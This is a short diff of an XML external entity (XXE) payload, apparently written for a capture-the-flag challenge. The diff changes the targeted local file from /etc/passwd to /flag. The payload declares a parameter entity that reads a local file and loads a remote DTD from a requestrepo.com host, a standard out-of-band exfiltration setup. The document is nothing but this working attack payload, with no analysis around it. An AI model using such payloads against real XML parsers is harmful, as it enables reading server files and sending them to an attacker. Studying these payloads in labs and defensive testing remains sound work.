@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <!DOCTYPE data [
   <!ENTITY % file SYSTEM
-  "file:///etc/passwd">
+  "file:///flag">
   <!ENTITY % dtd SYSTEM
   "http://krhelbvr.requestrepo.com/evil.dtd">
   %dtd;
